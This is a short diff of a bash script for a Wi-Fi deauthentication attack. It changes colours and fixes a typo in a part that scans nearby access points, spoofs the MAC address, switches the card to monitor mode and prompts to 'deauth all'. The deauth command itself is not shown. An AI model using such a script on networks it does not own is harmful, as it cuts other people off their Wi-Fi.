@@ -12,9 +12,9 @@ clear
 echo "thanks for using my script"
 }
 
-
+echo -e "\e[36m "
 iwconfig
-echo -e "type the name of your wireless card"
+echo -e "\e[31mtype the name of your wireless card\e[36m"
 read wire
 
 ifconfig $wire down
@@ -25,13 +25,13 @@ echo "Scanning all the AP's and temporarily saving them"
 iwlist $wire scan > /tmp/scan.tmp
 cat /tmp/scan.tmp | egrep "Address|Channel:" | cut -d \- -f 2 | sed -e "s/Address: //" | sed -e "s/Channel://" > /tmp/APad.tmp
 
-echo "Your wirelesscard is now spoofing its mac address and getting in monitor mode"
+echo "Your wireless card is now spoofing its mac address and getting in monitor mode"
 
 airmon-ng start wlan0
 airmon-ng check kill
 clear
-echo "press enter to deauth all"
-echo "when you are done press ctrl+c"
+echo -e "\e[31mpress enter to deauth all"
+echo -e "when you are done press ctrl+c\e[36m"
 read
 trap cleanup EXIT	
 cd ~
